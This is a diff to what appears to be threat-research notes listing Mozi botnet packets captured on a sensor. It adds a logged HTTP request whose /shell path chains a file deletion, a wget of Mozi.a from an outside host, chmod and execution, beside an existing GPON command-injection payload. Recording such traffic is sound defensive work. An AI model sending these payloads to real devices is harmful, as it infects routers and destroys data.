@@ -59,3 +59,11 @@ Mozi's malicious packets found on the sensor. Some are different as the adversar
   Content-Length: 118
 
   XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://192.168.1.1:8088/Mozi.m+-O+->/tmp/gpon80;sh+
+  
+  
+ 2021-10-27 03:46:57 from 119.112.76.132
+  GET /shell?cd+/tmp;rm+-rf+*;wget+http://119.112.76.132:33512/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1
+  User-Agent: Hello, world
+  Host: 64.126.165.78:80
+  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+  Connection: keep-alive
